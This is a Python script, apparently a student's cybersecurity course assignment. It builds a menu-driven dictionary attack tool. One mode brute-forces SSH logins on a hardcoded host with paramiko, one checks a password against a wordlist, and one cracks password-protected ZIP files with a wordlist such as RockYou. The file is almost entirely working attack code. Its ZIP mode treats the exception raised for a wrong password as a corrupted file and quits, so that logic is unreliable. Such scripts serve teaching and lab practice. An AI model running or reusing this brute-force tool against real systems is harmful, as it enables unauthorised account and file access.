#!/usr/bin/python3
import sys
import paramiko
import time
from getpass import getpass
import zipfile

# Script Name:                  Automated Brute Force Wordlist Attack Tool Part 3 of 3
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      08/02/2023
# Purpose                       First, setup your target ZIP file.

#                               Create a .txt file containing a secret message.
#                               Follow the guide, How to Protect Zip file with Password (https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/)
#                               to archive the .txt file with password protection.
#                               Next, add a new mode to your Python brute force tool that allows you to brute force attack a password-locked zip file.
#                               
#                               Use the zipfile library.
#                               Pass it the RockYou.txt list to test all words in the list against the password-locked zip file.
#                               
#                               
#                               
#     
# Variables
# SSH server credentials
ssh_serverIP = '192.168.0.101'
ssh_username = 'username'



# Functions
# First Mode: iterates through wordlist
def iterator():
    # user input complete filepath
    filepath = input("Enter filepath for wordlist: ")
    # Open wordlist
    file = open(filepath, 'r')
    # Read file first line on wordlist/ variable called line
    line = file.readline()

    # while loop for each line in wordlist
    while line:
        # not reading empty trailing space
        line = line.rstrip()
        # line variable into word
        word = line
        print(f"Password: {word}")
        # SSH authentication
        try:
            # username and IP address of SSH server
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ssh_serverIP, username=ssh_username, password=word)

            # Authentication succeeded
            print(f"Login Successful! Password: {word}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            # If authentication fails, try next password in wordlist
            pass
        time.sleep(1)
        # Next line in wordlist
        line = file.readline()
    file.close()



# Second Mode: Defensive; Password Recognized
def password_recognized():
    # User Password
    user_password = getpass("Enter password:")
    # User input word list file path
    filepath = input("Enter filepath for wordlist: ")
    # Open wordlist
    with open(filepath, 'r') as file:
        # Read all lines & remove trailing spaces
        word_list = [line.strip() for line in file]
    # Check ifinput string is in the wordlist
    if user_password in word_list:
        print("The password appeared in the wordlist.")
    else:
        print("The password did not appear in the wordlist.")


# Function: ZIP File Brute Force Attack
def zip_brute_force_attack():
    # User input path to password-protected zip file
    zip_file_path = input("Enter path of password-protected ZIP file: ")
    # Ask user for path to wordlist
    filepath = input("Enter filepath for wordlist: ")
     # Open wordlist and read contents
    try:
        with open(filepath, 'r', errors='ignore') as file:
            word_list = [line.strip() for line in file]
    # If wordlist not found return from function
    except FileNotFoundError:
        # print error
        print(f"File not found: {filepath}")
        return
    # Open password-protected ZIP file with library import zipfile.ZipFile() function
    # Try to extract contents of ZIP file with current password
    try:
        with zipfile.ZipFile(zip_file_path) as zip_file:
            # Iterate through each word in the word list
            for word in word_list:
                # Try extract contents of ZIP file using current password
                try:
                    ## The pwd parameter in extractall() convert word to bytes
                    zip_file.extractall(pwd=bytes(word, 'utf-8'))
                    print(f"Password found: {word}")
                    # Stop brute force attack
                    return
                # If error print message and return from function
                except (RuntimeError, zipfile.BadZipFile):
                    print("Error: Invalid or corrupted ZIP file.")
                    return
                # password incorrect: if extraction exception occurs and go to next word on list
                except Exception:
                    pass
        # loop finished wordlist and password not found
        print("Password not found. Brute force attack unsuccessful.")
    # Password-protected zip-file not found
    except FileNotFoundError:
        print(f"File not found: {zip_file_path}")



# Main
# Mode menu
mode = input("""Select a mode: 
             1: Offensive; Dictionary Iterator. 
             2: Defensive; Password Recognized.
             3: ZIP File Brute Force Attack.
             4: Exit 
             """)

# Run the corresponding mode
if mode == '1':
    iterator()
elif mode == '2':
    password_recognized()
elif mode == '3':
    zip_brute_force_attack()
elif mode == '4':
    sys.exit()
else:
    print("Invalid mode selection, Please choose 1, 2 or 3.")


# END 
# Class Video and ChatGPT Assited

#           Resources
#               [Zipfile documentation](https://docs.python.org/3/library/zipfile.html#module-zipfile)